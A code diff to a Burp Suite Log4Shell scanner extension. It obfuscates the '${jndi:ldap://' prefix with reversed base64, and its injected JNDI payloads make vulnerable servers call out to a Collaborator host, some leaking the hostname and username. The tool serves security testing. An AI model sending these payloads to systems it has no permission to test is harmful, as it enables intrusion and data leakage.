@@ -1,5 +1,5 @@
 /*
- * This file is part of Log4Shell scanner for Burp Suite (https://github.com/silentsignal/burp-piper)
+ * This file is part of Log4Shell scanner for Burp Suite (https://github.com/silentsignal/burp-log4shell)
  * Copyright (c) 2021 Andras Veres-Szentkiralyi
  *
  * This program is free software: you can redistribute it and/or modify
@@ -34,6 +34,7 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
     private lateinit var callbacks: IBurpExtenderCallbacks
     private lateinit var helpers: IExtensionHelpers
     private lateinit var collaborator: IBurpCollaboratorClientContext
+    private lateinit var staticPrefix: String
 
     private val crontab: ConcurrentHashMap<String, Pair<IHttpRequestResponse, IntArray>> = ConcurrentHashMap()
     private val thread: Thread = object : Thread() {
@@ -59,6 +60,8 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
         helpers = callbacks.helpers
         collaborator = callbacks.createBurpCollaboratorClientContext()
 
+        staticPrefix = String(helpers.base64Decode("=QyeK5ERJpDTEFEU68yL".reversed())).reversed().toLowerCase();
+
         callbacks.setExtensionName(NAME)
         callbacks.registerScannerCheck(this)
         callbacks.registerExtensionStateListener(this)
@@ -77,7 +80,7 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
         for ((prefix, key) in listOf(Pair(QUERY_NOTHING, null), Pair(QUERY_HOSTNAME, "hostName"), Pair(QUERY_HOSTUSER, "hostName}-s2u-\${env:USERNAME:-\${env:USER}"))) {
             val payload = collaborator.generatePayload(false)
             val keyLookup = if (key == null) "" else "\${$key}"
-            val bytes = "\${jndi:ldap://${prefix}${keyLookup}.$payload.${collaborator.collaboratorServerLocation}:99999/s2test}".toByteArray()
+            val bytes = "$staticPrefix${prefix}${keyLookup}.$payload.${collaborator.collaboratorServerLocation}:99999/s2test}".toByteArray()
             val request = insertionPoint!!.buildRequest(bytes)
             val poff = insertionPoint.getPayloadOffsets(bytes)
             val hs = baseRequestResponse!!.httpService
